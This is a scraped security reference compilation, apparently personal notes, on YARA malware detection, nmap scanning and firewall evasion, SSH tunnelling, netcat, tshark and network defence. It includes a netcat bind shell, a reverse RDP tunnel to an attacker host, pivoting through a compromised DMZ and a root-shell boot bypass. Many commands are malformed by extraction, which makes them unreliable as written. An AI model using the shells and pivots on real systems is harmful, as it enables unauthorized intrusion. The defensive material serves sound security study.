Collecting Hunting for IOCs with gusto and style: https://github.com/rastrea2r/rastrea2r","title":"Tools"},{"location":"malware/#defense","text":"New References Detecting malicious certificates: https://github.com/Neo23x0/signature-base/blob/master/yara/gen_cert_payloads.yar YARA Rule-based approach to create descriptions of malware families based on textual or binary patterns. Rules are composed of two sections: strings definition (optional) condition Example rule: rule dummy { condition : true } rule silent_banker : banker { meta : description = This is just an example threat_level = 3 in_the_wild = true strings : $ a = { 6 A 40 68 00 30 00 00 6 A 14 8 D 91 } $ b = { 8 D 4 D B0 2 B C1 83 C0 27 99 6 A 4 E 59 F7 F9 } $ c = UVODFRYSIHLNWPEJXQZAKCBGMT condition : $ a or $ b or $ c } Sections Meta Section Strings Section Specifies the strings that are used to identify. In YarGen, there are three categories of these strings, marked by $ s , $ x , and $ z . $ s (\"Highly Specific Strings\") are very specific strings that will not appear in legitimate software. Server addresses Names of hacking tools and malwar Typos in common strings $ x (\"Specific Strings\") are likely to be indicators of malware files, but might also appear in legitimate files. $ z are likely to be ordinary but are not currently included in the goodware string database. Condition Section Boolean expressions that specify the additional conditions of that rule. https://yara.readthedocs.io/en/v3.4.0/writingrules.html#conditions GitHub: https://github.com/virustotal/yara awesome-yara: https://github.com/InQuest/awesome-yara Rule Sets: yara-forensics: https://github.com/Xumeiquer/yara-forensics set of rules that search for magic headers on files and dump files like raw image of dd Rules: https://github.com/Yara-Rules/rules Rules by Neo23x0: https://github.com/Neo23x0/signature-base/tree/master/yara AlienVaultLabs: Malware related to APTs: https://github.com/AlienVault-Labs/AlienVaultLabs Analyze: yara yara - rule target - file - m : print metadata of rules satisfied - c : print number of matches ( file path : match result ) - s : print matching string ( hexadecimal virtual address : $ string identifier : string value ) - p : prefix the description Analyze using multiple rules: for file in $( find PATH-TO-DIRECTORY-CONTAINING-RULES -name *.yar ) ; do test $( yara -c ${ file } PATH-TO-FILE ) -gt 0 echo $file ; done 2 /dev/null yaraGen - Creation of yara rules from strings found in malware files while removing all strings that also appear in goodware files. yarGen includes a big goodware strings and opcode database: https://github.com/Neo23x0/yarGen python yarGen.py --update python yarGen.py -m PATH_TO_MALWARE_DIRECTORY A YarGen rule can be: simple rule super rule: If multiple sample files are used, YarGen will try to identify the similarities between the samples and combine the identified strings into a \"super rule\". Metadata section has: super_rule = 1 . Simple rules generated for each file is still there. Overlap of rule strings between the simple rules and the super rule. --nosimple to remove simple rules. --nosuper not to create super rules. Options: --excludegood : exclude all of the goodware strings --score flag : output the scores as comments in the rule file - rc (maxstrings): maximum number of strings to include in each rule (20 by default) - z (min-score): minimum score a script should have to be included in rule - a : author - r : reference","title":"Defense"},{"location":"malware/#references","text":"Linux - Sandbox - https://github.com/danieluhricek/LiSa","title":"References"},{"location":"malware/#new-references","text":"The Road To Reverse Engineering Malware: https://www.secjuice.com/the-road-to-reverse-engineering-malware/ Unpacking the packed unpacker: https://www.virusbulletin.com/blog/2019/01/ vb2018-paper-unpacking-packed-unpacker-reversing-android-anti-analysis-library/ ELF in-memory execution: https://blog.fbkcs.ru/en/elf-in-memory-execution/ Botnet Takeover (NSA Docs): https://twitter.com/0xffff0800/status/1077052289175609344 An example rootkit that gives a userland process root permissions: https://github.com/PinkP4nther/Sutekh https://cybersecurity.att.com/blogs/security-essentials/building-a-home-lab-to-become-a-malware-hunter-a-beginners-guide https://pentestlab.blog/2018/06/06/command-and-control-browser/ https://github.com/0x09AL/Browser-C2","title":"New References"},{"location":"network/","text":"Quick Reference Cheat Sheets Nmap: https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf Wireshark: https://packetlife.net/media/library/13/Wireshark_Display_Filters.pdf TcpDump: https://packetlife.net/media/library/12/tcpdump.pdf Netcat: https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf Ncat: https://medium.com/@pentest_it/ncat-cheatsheet-ddc5f07d8533 Scapy: https://blogs.sans.org/pen-testing/files/2016/04/ScapyCheatSheet_v0.2.pdf Quick Reference How to Find Your Public IP Address on Linux Command Line : curl https : // ipaddr . pub MAC to IPv6: https://ben.akrin.com/?p=1347 take the mac address: for example 52 : 74 : f2 : b1 : a8 : 7 f throw ff : fe in the middle: 52:74:f2: ff : fe :b1:a8:7f reformat to IPv6 notation 5274 : f2ff : feb1 : a87f convert the first octet from hexadecimal to binary: 52 - 01010010 invert the bit at index 6 (counting from 0): 01010010 - 01010000 convert octet back to hexadecimal: 01010000 - 50 replace first octet with newly calculated one: 5074 : f2ff : feb1 : a87f prepend the link-local prefix: fe80 :: 5074 : f2ff : feb1 : a87f https://stackoverflow.com/questions/27693120/convert-from-mac-to-ipv6 format_eui_64 () { local macaddr = $1 printf %02x%s $ (( 16 #$ { macaddr : 0 : 2 } ^ 2 # 00000010 )) ${macaddr:2} \\ | sed - E - e s / ([ 0 - 9 a - zA - Z ]{ 2 }) */ 0 x \\ 0 |/ g \\ | tr - d : \\ n \\ | xargs - d | \\ printf %02x%02x:%02xff:fe%02x:%02x%02x } HTTP Request with / dev / tcp exec 3 /dev/tcp/ ( INTERNAL IP ADDRESS ) /80 echo -e GET / HTTP/1.1\\r\\nHost: (INTERNAL IP ADDRESS)\\r\\nConnection: close\\r\\nUser-Agent: Mozilla/5.0 (X11;Linux x86_64...) Gecko/20100101 Firefox/60.0\\r\\n\\r\\n 3 cat 3 TCP Flag Key: http://rapid.web.unc.edu/resources/tcp-flag-key/ Network Discovery nmap - sn target addresses # disable port scanning ( keep discovery enabled ) nmap - sP 192 . 168 . 1 . 1 - 255 ettercap - T - i eth0 /// netdiscover - i ens33 IPv6 ping ( TARGET IP ADDRESS ) arp - a Virtual firewall bypass https://0xdf.gitlab.io/2019/04/06/htb-vault.html route check routing table and look for the firewall node (gateways) ip addr add 192 . 168 . 5 . 3 / 24 dev ens3 add a new network interface route delete - net 192 . 168 . 5 . 0 gw 192 . 168 . 122 . 5 netmask 255 . 255 . 255 . 0 remove rule that's doing traffic forwarding to firewall time for i in $ ( seq 1 254 ) ; do (ping -c 1 192.168.5.${i} | grep bytes from ); done host scan iptables - L to get an idea about any blocking rules Simple Protocol for Independent Computing Environments (SPICE) https://en.wikipedia.org/wiki/Simple_Protocol_for_Independent_Computing_Environments https://0xdf.gitlab.io/2019/04/06/htb-vault.html ps - auxww | grep - F spice port apt install remmina remmina - plugin - spice Send alt + ctrl + del to restart Send e to do to recovery mode Scroll down to the line that starts with linux Change ro to rw , and add init =/ bin / bash to the end Save reboot Network Security Monitoring Prevention eventually fails. One version of this philosophy is that security breaches are inevitable Prevention mechanisms can block some malicious activity, but it\u2019s increasingly difficult for organizations to defend themselves as adversaries adopt more sophisticated tactics. NSM is threat-centric, meaning adversaries are the focus of the NSM operation. Continuous Monitoring (CM) is vulnerability-centric, focusing on configuration and software weaknesses. NMS is a strategy backed by tactics that focus on visibility, not control. http://nsmwiki.org/ Placed outside of NAT/NPAT, so that the NSM sees actual source IP of traffic configure switch to send copies of the traffic they see to an otherwise unused switch port. Cisco calls this technique the Switched Port Analyzer . Juniper and Dell use the term port mirroring . intruders could disable a SPAN port in order to hide some of their activities or use network taps that provide separate ports with copies of network traffic. (Net Optics iTap Port Aggregator) Network address translation (NAT) Network port address translation (NPAT or PAT). Each translation device rewrites the wireless or internal source IP address to be a single IP value, and uses changing source ports to differentiate among sending computers. As with NAT, each translation device maintains a table to track any changes. Computers use the combination of source IP address, source port, destination IP address, destination port, and IP protocol to identify unique connections. Ports are the key in the translation process, as they permit several private IP addresses to be hidden behind a single public IP address. Recommendations Limit command shell access to the system to only those administrators who truly need it. Analysts should log in to the sensor directly only in an emergency. Instead, they should access it through tools that allow them to issue commands or retrieve data from the sensor. Administrators should never share the root account, and should never log in to sensors as the root account. If possible, access the sensor using shared keys, or use a two-factor or two-step authentication system like Google Authenticator. Always administer the sensor over a secure communications channel like OpenSSH. Do not centrally administer the sensor\u2019s accounts using the same system that manages normal IT or user assets. Always equip production sensors with remote-access cards. Assume the sensor is responsible for defending itself. Limit the expo- sure of services on the sensor, and keep all services up-to-date. Export logs from the sensor to another platform so that its status can be remotely monitored and assessed. If possible, put the sensor\u2019s management interface on a private network reserved for management only. If possible, use full disk encryption to protect data on the sensor when it is shut down. Create and implement a plan to keep the sensor software up-to-date. Treat the system like an appliance, but maintain it as a defensible platform. Tools Xplico ( http://www.xplico.org/ ) can rebuild a web page whose content was captured in network form Session Data / Transaction Data Bro ( http://www.bro.org/ ) can generate many types of logs based on its inspection of network traffic Argus ( http://www.qosient.com/argus/ ) can also generate records for this traffic Sguil ( http://www.sguil.net/ ) can also be used to view session data SANCP tool (http://nsmwiki .org/SANCP) to collect session data and render Statistical Data Capinfos of Wireshark Metadata RobTex ( http://www.robtex.com ) offers a free resource to show routing data Alert Data Snort (http:// www.snort.org/ ) Suricata ( http://suricata-ids.org/ ) Consoles: Sguil or Snorby (http:// www.snorby.org/ ) - Snorby is a web-based tool, whereas Sguil is a \u201cthick client\u201d that users install on their desktops Security Onion (SO) NSM suite Linux distro for IDS and NSM Snort Suricata Sguil Squert: View NIDS/HIDS alerts and HTTP logs Snorby: View and annotate IDS logs ELSA: Seach logs (IDS, Bro, syslog) Xplico: Carve PCAP files sudo service nsm status curl www . testmyids . com Create separate user for each sensor (SSH) Port Scanning FPing: for ip in $ ( seq 1 254 ) ;do fping 10.11.1.$ip fping.txt;done;grep alive ./fping.txt Nc: for ip in $ ( seq 1 5 ) ; do nc -nvv -z 192.168.1.$ip 80 /tmp/ncscan.txt done nc - z - v ( TARGET IP ADDRESS ) 1 - 1024 2 / dev / stdout | grep - v refused ARP ping: nmap - sP - PR 10 . 11 . 1 . 0 / 24 - oG nmap - arp . txt Ping: for ip in $ ( seq 1 254 ) ;do ping -c 1 192.168.1.$ip | grep bytes from | cut -d -f4 | cut -d : -f1 done /dev/tcp: for port in $ ( seq 1 65530 ) ; do (echo $port /dev/tcp/$target/$port printf [!] $port is open.\\n ) 2 /dev/null done Port monitor watch -n1 nc -w1 -nvz 192 .168.1.23 123 # -w1: timeout 1 sec, -n: no reverse lookup, -v: verbose, -z: no IO, act as a scanner Nmap: Evade Firewall - sA - TCP ACK Scan Because of the ACK packets the firewall cannot create the log Firewalls treat ACK packet as the response of the SYN packet - Open port (few ports in the case of the firewall) Closed port (most ports are closed because of the firewall) Filtered (Nmap is not sure whether the port is open or not) Unfiltered (Nmap can access the port but is still confused about the open status of the port) - sW - TCP Window Scan Designed to differentiate between open and closed ports instead of showing unfiltered Does not open any active session with the target computer Send ACK packets and receive a single RST packet in response - f , - ff - Fragment Packets - spoof - mac Cisco - Spoof MAC - scan_delay - control the delay between each and every request - host - timeout Types of port scans TCP Connect Scan: nc - nvv - w 1 - z ip port - range Full 3 way handshake SYN / Stealth Scan Send SYN SYN-ACK means open RST means closed UDP Scanning: nc - nv - u - z - w 1 ip port - range ICMP port unreachable means closed No response means open Port Knocking: for x in 1111 , 2222 , 3333 ; do nmap -Pn --host_timeout 201 --scan-delay 0.2 --max-retries 0 -p $x IP ; done Look for: knockd Configured at: \u200b / etc / knockd . conf \u200b Scanning Methods All TCP and UDP fast scan: masscan -p1-65535,U:1-65535 IP --rate = 1000 -e tun0 -p1-65535,U:1-65535 ports ports = $( cat ports | awk -F {print $4} | awk -F / {print $1} | sort -n | tr \\n , | sed s/,$// ) nmap -Pn -sV -sC -sU -sT -p $ports IP Quick all TCP scan using Nmap only: ports =( nmap -p- --min-rate = 1000 -T4 IP | grep ^ [ 0 -9 ] | cut -d / -f 1 | tr \\n , | sed s/,$// ) nmap -Pn -sV -sC -sU -sT -p $ports IP Quick all TCP and UDP scan using Nmap only: ports =( nmap -p- --min-rate = 1000 -T4 IP | grep ^ [ 0 -9 ] | cut -d / -f 1 | tr \\n , | sed s/,$// ) nmap -Pn -sV -sC -sU -sT -p $ports IP nmap -sS -T5 -A -f -v IP nmap -n -Pn -sV --version-all --open -sC -oA [ target ] --stats-every 120 nmap -T4 -sV -sC -Pn [ box ip ] -oA [ box_name ] _initial_scan Vulnerability Scanning Nmap nmap -v -p 80 --script http-vuln-cve2010-2861 ip nmap -v -p 80 --script all ip nmap -v -p 80 -sC ip nmap -v -p 80 --script default,safe ip OpenVAS openvas - setup https : // ip : 9392 Port Forwarding / Tunneling Local: ssh gateway -L local port to listen : remote host : remote port Remote: ssh gateway -R remote port to bind : local host : local port Dynamic: ssh gateway -D port to bind Local: plink.exe gateway -L local port to listen : remote host : remote port Remote: plink.exe gateway -R remote port to bind : local host : local port Dynamic: plink.exe gateway -D port to bind Local Port Forwarding https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot ssh -L local-port-to-listen : remote-host : remote-port gateway Allow connections to a specific blocked server. From work login to home and use it as a gateway to access banned - site . com : 80 : ssh -L 9001 :banned-site.com:80 user@home #work curl http://localhost:9001 #home ssh -L 9001 :banned:22 user@home ssh -p 9001 localhost Allow remote connections to local port forwards (listening on all interfaces) ssh -L 9001 :banned:22 user@home -g ssh -p 9001 work_machine #remotely Access a port on your server which can only be accessed from localhost and not remotely. Server acts as the gateway and binds server's port 5432 to local port 9000. ssh -L 9000 :localhost:5432 user@server psql -h localhost -p 9000 Remote Port Forwarding https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot Allow remote access to restricted network. Server will bind port 9001 on home machine to listen for incoming requests which would subsequently be routed through the created SSH channel. Connecting to localhost : 9001 in home will forward user to intra:22 ssh -R 9001 :intra-ssh-server:22 user@home #work ssh -p 9001 localhost #home Add GatewayPorts yes to sshd_config to listening on all interfaces. Allow public access to a local resource through a public server. ssh -R 9000 :localhost:3000 user@public_sever sudo vim /etc/ssh/sshd_config GatewayPorts yes sudo service ssh restart Dynamic port forwarding One local port for tunneling data to all remote destinations (SOCKS protocol) ssh -D 9001 home ssh -fND 9001 home echo socks5 127.0.0.1 9999 / etc / proxychains . conf curl http : // 192 . 168 . 122 . 4 proxychains curl 192 . 168 . 122 . 4 Quick Reference Monitoring Tunnels: netstat - tunelp Avoid TTL: - nNT Creating reverse SSH client to tunnel-out remote desktop port FROM remote non-routable machine pling -l root -pw password attacker-ip -R 3390 :127.0.0.1:3389 # localhost 3389 to attacker ip 3389 FROM attacker's machine rdesktop localhost:3390 SSH Dynamic Port Forwarding (compromised DMZ used to scan internal IPs) Create local SOCS4 proxy: From attacker's machine (compromised DMZ) ssh -D 8080 root@DMZ-IP netstat -antp | grep 8080 /etc/proxychains.conf socks4 127 .0.0.1 8080 proxychains nmap -p 3389 -ST -Pn non-routable-remote-ip-range --oepn proxychains rdesktop rdp-ip-in-non-routable-range Ncat: Forward local 1234 to command sudo / usr / bin / ncat - l 1234 -- sh - exec ncat 192.168.5.2 987 -p 53 Tools rinetd When outbound only 80 / 443 use port forwarding (ip1:80 will proxy for ip2:3389) nano / etc / rinetd . conf ip1 80 ip2 3389 bindaddress bindport connectaddress connectport XFLTReaT tunnelling framework: https://github.com/earthquake/XFLTReaT TCP UDP ICMP SOCKS v4 , 4 a , 5 HTTP CONNECT SCTP ( by Darren Martyn @ info_dox ) WebSocket DNS ( A / CNAME , PRIVATE , NULL ) - Proof of Concept RDP ( Windows only ) https://github.com/sshuttle/sshuttle https://github.com/klsecservices/rpivot https://github.com/wolfSSL/wolfssh https://github.com/jpillora/chisel References https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/ http://www.debianadmin.com/howto-use-ssh-local-and-remote-port-forwarding.html https://blog.trackets.com/2014/05/17/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples.html New References https://vimeo.com/54505525 Tools Inject code and spy on wifi users: https://github.com/DanMcInerney/LANs.py Collection of PowerShell network security scripts for system administrators: https://github.com/thom-s/netsec-ps-scripts CyberScan: Network's Forensics ToolKit Sparta: https://github.com/SECFORCE/sparta BetterCap - Swiss army knife for network attacks and monitoring: https://www.bettercap.org/ Pwning WPA/WPA2 Networks With Bettercap and the PMKID Client-Less Attack: https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/#.XGRV3mo06jA.twitter Nmap Port Related Information: / usr / share / nmap / nmap - servies ICMP (Ping) Sweep: nmap - sn pi - rage nmap - sn ip - range - oG filename ( grepable format ) Sweep TCP/UDP ports: nmap - p 80 ip - range - oG filename Sweep full network for top ports: nmap - sT - A --top-ports=20 ip-range -G filename Script engine: ls - l / usr / share / nmap / scripts | grep smb Important flags - O for OS Fingerprinting - sV for banner grabbing Netstat Kernel IP routing table: netstat - nr Listening ports: netstat - lp netstat - lvnp Netcat Cheat sheet: https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf General Commands Listen on port 567/TCP: nc - l - p 567 Connecting to 567 of 1.2.3.4: nc 1 . 2 . 3 . 4 5676 Pipe a text file to the listener: cat infile | nc 1 . 2 . 3 . 4 567 - q 10 Have the listener save a received text file: nc - l - p 567 textfile Transfer a directory: Reciever: nc - l - p 678 | tar xvfpz Sender: tar zcfp - / path / to / directory | nc - w 3 1 . 2 . 3 . 4 678 Send a message to your syslog server (the 0 means emerg): echo 0 message | nc - w 1 - u syslogger 514 Setup a remote shell listener: nc - v - e /bin/bash - l - p 1234 - t nc l p 1234 e c:\\windows\\system32\\cmd.exe Make an HTTP request: echo - e GET http://www.google.com HTTP/1.0nn | nc - w 5 www . google . com 80 One-page webserver: cat homepage . txt | nc - v - l - p 80 General Options Use IPv4 addressing only: nc - 4 [ options ] [ host ] [ port ] Use IPv6 addressing only: nc - 6 [ options ] [ host ] [ port ] UDP instead of TCP: nc - u [ options ] [ host ] [ port ] Listen for an incoming connection: nc - l [ host ] [ port ] Continue listening after client has disconnected: nc - k - l [ host ] [ port ] No DNS lookups: nc - n [ host ] [ port ] Use specific source port: nc - p [ source port ] [ host ] [ port ] Use source IP: nc - s [ source ip ] [ host ] [ port ] Apply 'n' second timeout: nc - w [ timeout ] [ host ] [ port ] Verbose output: nc - v [ host ] [ port ] Port Scanning Scan a single TCP port: nc - zv hostname . com 80 Scan a range of ports: nc - zv hostname . com 80 - 84 Scan multiple ports: nc - zv hostname . com 80 84 Other One page web server: while : ; do ( echo -ne HTTP/1.1 200 OK\\r\\nContent-Length: $(wc -c index.html)\\r\\n\\r\\n ; cat index.html; ) | nc -l -p 8080 ; done Proxy: mknod backpipe p ; nc - l [ proxy port ] backpipe | nc [ destination host ] [ destination port ] pipe Wrap readline history library (support up arrow, etc): rlwrap nc - t remotehost 23 References: https://kapeli.com/cheat_sheets/Netcat.docset/Contents/Resources/Documents/index http://workrobot.com/sysadmin/security/netcat_cheatsheet.html Techniques Domain Fronting Tools Psiphon: https://www.psiphon3.com/en/index.html Meek: https://trac.torproject.org/projects/tor/wiki/doc/AChildsGardenOfPluggableTransports#meek References Introduction: https://www.andreafortuna.org/cybersecurity/privacy/domain-fronting-in-a-nutshell/ Usage in APT29: https://www.fireeye.com/blog/threat-research/2017/03/apt29_domain_frontin.html Azure (Hardening Your Azure Domain Front): https://medium.com/@rvrsh3ll/hardening-your-azure-domain-front-7423b5ab4f64 A 101 on Domain Fronting: https://digi.ninja/blog/domain_fronting.php Domain Fronting with CloudFront: https://digi.ninja/blog/cloudfront_example.php Traffic Analysis Accounting Traffic #!/bin/bash # Reset counters and iptables rules iptables -Z iptables -F # Measure incoming traffic from lab machine iptables -I INPUT 1 -s 192 .168.1.23 -j ACCEPT # Measure outgoing traffic to lab machine iptables -I OUTPUT 1 -d 192 .168.1.23 -j ACCEPT watch - n 1 iptables - nvL Using a Capture: aircrack - ng captured . cap \u200b Netcap - A framework for secure and scalable network traffic analysis: https://github.com/dreadl0ck/netcap PCAP Samples: Netresec: https://www.netresec.com/?page=pcapfiles Malware Traffic Analysis: https://www.malware-traffic-analysis.net/ Packettotal (Just like virustotal but for PCAP Analysis): https://packettotal.com/ https://wiki.wireshark.org/SampleCaptures PA Toolkit (Pentester Academy Wireshark Toolkit) - PA Toolkit is a collection of traffic analysis plugins to extend the functionality of Wireshark from a micro-analysis tool and protocol dissector to the macro analyzer and threat hunter: https://github.com/pentesteracademy/patoolkit CapAnalysis: https://drive.google.com/uc?authuser=0 id=1Lf8yU7alFZdRlT6WstKjngN2RAp-1jG8 export=download Netsh (Windows) netsh trace show capturefilterhelp netsh trace show scenarios netsh trace show globalkeywordsandlevel netsh trace start capture = yes IPv4 . Address = 192 . 168 . 122 . 2 netsh trace start scenario = InternetClient , InternetServer , NetConnection globalLevel = win : Verbose capture = yes report = yes traceFile = C : \\ temp \\ trace \\ trace001 . etl netsh trace stop Use Microsoft Network Monitor 3.4 to view: https://www.microsoft.com/en-us/download/details.aspx?id=4865 Convert to PAC from: https://github.com/microsoft/etl2pcapng Use powershell to convert: $s = New-PefTraceSession -Path \u201c C : \\ output \\ path \\ spec \\ OutFile . Cap \u201d -SaveOnStop $s | Add-PefMessageProvider -Provider \u201c C : \\ input \\ path \\ spec \\ Input . etl \u201d $s | Start-PefTraceSession tcpdump to show HTTP request/response headers https://serverfault.com/questions/504431/human-readable-format-for-http-headers-with-tcpdump sudo tcpdump -A -s 10240 tcp port 4080 and (((ip[2:2] - ((ip[0] 0xf) 2)) - ((tcp[12] 0xf0) 2)) != 0) | egrep --line-buffered ^........(GET |HTTP\\/|POST |HEAD )|^[A-Za-z0-9-]+: | sed -r s/^........(GET |HTTP\\/|POST |HEAD )/\\n\\1/g sudo stdbuf -oL -eL /usr/sbin/tcpdump -A -s 10240 tcp port 4080 and (((ip[2:2] - ((ip[0] 0xf) 2)) - ((tcp[12] 0xf0) 2)) != 0) | egrep -a --line-buffered .+(GET |HTTP\\/|POST )|^[A-Za-z0-9-]+: | perl -nle BEGIN{$|=1} { s/.*?(GET |HTTP\\/[0-9.]* |POST )/\\n$1/g; print } tcpdump tcpdump - i eth1 - s 0 port not 22 tcpdump - i eth1 - s 0 port not 22 and port not 53 tcpdump - i eth1 port not 22 and host 1 . 2 . 3 . 4 TSHark General Supported network interfaces: tshark - D Sniff on eth0: tshark - i eth0 Open pcap : tshark - r HTTP_traffic . pcap Read 100 packets from pcap : tshark - r HTTP_traffic . pcap - c 100 Print full details for first 10 Packets: tshark - r HTTP_traffic . pcap - c 10 - V List of protocols in pcap : tshark - r HTTP_traffic . pcap - z io , phs - q Export into PDML: tshark - r HTTP_traffic . pcap - T pdml http . xml PDML to HTML: xsltproc / usr / share / wireshark / pdml2html . xsl http . xml http . html HTTP Only the HTTP traffic: tshark - Y http - r HTTP_traffic . pcap IP packets sent from IP address 192.168.252.128 to 52.32.74.91?: tshark - r HTTP_traffic . pcap - Y ip.src==192.168.252.128 ip.dst==52.32.74.91 Packets containing GET requests: tshark - r HTTP_traffic . pcap - Y http.request.method==GET Print only source IP and URL for all GET request packets: tshark - r HTTP_traffic . pcap - Y http.request.method==GET - Tfields - e frame . time - e ip . src - e http . request . full_uri Packets contain the \"password\" string: tshark - r HTTP_traffic . pcap - Y http contains password \u201d Destination IP for GET requests sent to New York Times ( www.nytimes.com ): tshark - r HTTP_traffic . pcap - Y http.request.method==GET http.host==www.nytimes.com - Tfields - e ip . dst Session ID being used by 192.168.252.128 for Amazon India store (amazon.in)?: tshark - r HTTP_traffic . pcap - Y ip contains amazon.in ip.src==192.168.252.128 - Tfields - e ip . src - e http . cookie Type of OS 192.168.252.128 is using: tshark - r HTTP_traffic . pcap - Y ip.src==192.168.252.128 http - Tfields - e http . user_agent HTTPS Only show SSL traffic?: tshark - r HTTPS_traffic . pcap - Y ssl Only print the source IP and destination IP for all SSL handshake packets: tshark - r HTTPS_traffic . pcap - Y ssl.handshake - Tfields - e ip . src - e ip . dst List issuer name for all SSL certificates exchanged: tshark - r HTTPS_traffic . pcap - Y ssl.handshake.certificate - Tfields - e x509sat . printableString Print the IP addresses of all servers accessed over SSL: tshark - r HTTPS_traffic . pcap - Y ssl ssl.handshake.type==1 - Tfields - e ip . dst IP addresses associated with Ask Ubuntu servers (askubuntu.com): tshark - r HTTPS_traffic . pcap - Y ip contains askubuntu The IP address of the user who interacted with with Ask Ubuntu servers (askubuntu.com) tshark - r HTTPS_traffic . pcap - Y ip.dst==151.101.1.69 || ip.dst==151.101.193.69 || ip.dst==151.101.129.69 || ip.dst==151.101.65.69 - Tfields - e ip . src What DNS servers were used: tshark - r HTTPS_traffic . pcap - Y dns dns.flags.response==0 - Tfields - e ip . dst Name of the antivirus solution: tshark - r HTTPS_traffic . pcap - Y ip contains avast - Tfields - e ip . src WiFi Show only WiFi traffic: tshark - r WiFi_traffic . pcap - Y wlan View the deauthentication packets: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype==0x000c Display WPA handshake packets: tshark - r WiFi_traffic . pcap - Y eapol Print the SSID and BSSID values for all beacon frames: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype==8 - Tfields - e wlan . ssid - e wlan . bssid What is BSSID of SSID \"LazyArtists\": tshark - r WiFi_traffic . pcap - Y wlan.ssid==LazyArtists - Tfields - e wlan . bssid Channel of SSID \"Home_Network\": tshark - r WiFi_traffic . pcap - Y wlan.ssid==Home_Network - Tfields - e wlan_radio . channel Devices that received deauth messages: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype==0x000c - Tfields - e wlan . ra Which device does MAC 5c:51:88:31:a0:3b belongs to: tshark - r WiFi_traffic . pcap - Y wlan.ta==5c:51:88:31:a0:3b http - Tfields - e http . user_agent Beacon frames present: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype == 0x0008 Unique list of all AP BSSIDs: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype == 0x0008 - T fields - e wlan . bssid | sort | uniq Unique list of all AP SSIDs: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype == 0x0008 - T fields - e wlan . ssid | sort | uniq Only non-null SSIDs: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype == 0x0008 !(wlan.tag.length ==0) - T fields - e wlan . ssid | sort | uniq Unique list of SSID and BSSIDs side by side for all AP networks: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype == 0x0008 - T fields - e wlan . ssid - e wlan . bssid | sort | uniq VoIP Show VoIP traffic: tshark - r VoIP_traffic . pcap - Y sip or rtp Print all REGISTER packets: tshark - r VoIP_traffic . pcap - Y sip.Method==REGISTER Only print the source IP, sender extension and authorization digest response for REGISTER packets: tshark - r VoIP_traffic . pcap - Y sip.Method==REGISTER - Tfields - e ip . src - e sip . from . user - e sip . auth . digest . response Print all codecs being used by RTP protocol: tshark - r VoIP_traffic . pcap - Y sdp - Tfields - e sdp . media User who is using the Zoiper VoIP client: tshark - r VoIP_traffic . pcap - Y sip contains Zoiper - Tfields - e ip . src IP address of the SIP server used to place calls: tshark - r VoIP_traffic . pcap - Y sip.Method==REGISTER - Tfields - e ip . dst Content of the text message sent to +918108591527?: tshark - r VoIP_traffic . pcap - Y sip.Method == MESSAGE - V ( Read the content ) Extensions completed a call successfully: tshark - r VoIP_traffic . pcap - Y sip.Method==BYE - Tfields - e sip . from . user - e sip . to . user Defense Phishing Blacklist: https://www.phishing.army/ Open Source Security (OSSEC) is a free, open-source, host-based intrusion detection system (HIDS) log analysis portion of OSSEC as a log-based intrusion detection system (LIDS) OSSEC is a virtual appliance based on CentOS and includes Elastic search-Logstash-Kibana (ELK) Atomic rules are based on a single event occurring, while a composite rule is based on patterns across multiple logs. Hamachi by LogMeIn is a cloud-based, professional-level application that allows you to easily create a virtual private network (VPN) IPV6 Disallow traffic from unallocated IP address spaces Implement Anti-Spoofing perimeter ACL: No packet with a source address of your network allocation can ENTER your network. No packet with a destination address of your network allocation can LEAVE your network. Two categories of traffic Traffic initiated from perimeter security device Traffic that is in-transit across perimeter Transit Traffic Transit Traffic Category Recommendations Start with a DENY ALL approach, and then allow selectively. Ensures that all unassigned/experimental types are DROPPED. Allow Type 1: Destination Unreachable. Filter selectively allowing only specific codes such as code 4 - port unreachable. Allow Type 2: Packet too large. (Do not break path MTU discovery) Allow Type 3, Code 0 only. (TTL/Hop limit expired) Allow Type 4, Codes 0 and 1 only related to header errors. Transit traffic filtering continued\u2026 Optionally allow ICMP types 128/129 (echo request/reply) based on local ICMP security policy. Allow ICMP types 144 through 147 ONLY if your IPv6 network is \u201cmobility enabled\u201d. Many may choose to leave this in default drop state. Optionally allow ICMP Multicast related messages (types 151 - 153). ONLY applicable if you participate in global multicast sourcing. ICMP type 137 (Redirect) represents a direct security threat and should always be dropped at the perimeter. Non-transit Traffic initiated from perimeter security devices Again start with a DENY ALL policy Use the same recommendations as transit above with the exception of the mobility enabled class Additional messages to ALLOW should be: Types 133/134: Router solicitation / advertisement Types 135/136: Neighbor solicitation / advertisement Types 141/142: Inverse neighbor solicitation / advertisement Multicast Filtering Likely assumption for most is to not participate in global/inter-domain multicast Any packet with a multicast source address should be dropped Reserved and unused multicast destinations should be dropped. Probably most other multicast destinations will be blocked in a perimeter context. You don\u2019t want any site or organization local traffic crossing the perimeter Realm-local scoped traffic will be confined to specific technologies. The decision to drop realm-local will have to be policy based. Global multicast should be dropped if not participating inter-domain. Protocol Normalization IPv6 has a protocol header field labeled \u201cNext Header\u201d. Normal OSI Layer 4 headers are called an \u201cUpper Layer Header\u201d There can be chained \u201cExtension Headers\u201d in the frame before UL Header. IDS/IPS - Suricata Installation: sudo add - apt - repository ppa : oisf / suricata - stable sudo apt - get update sudo apt - get install suricata Update: suricata - update With cron: 0 0 * * * / usr / bin / suricata - update kill - USR2 $ ( pidof suricata ) / dev / null 2 1 suricata - update update - sources suricata - update list - sources suricata - update enable - source name suricata - update add - source name url suricata - update remove - source name suricata - update list - enabled 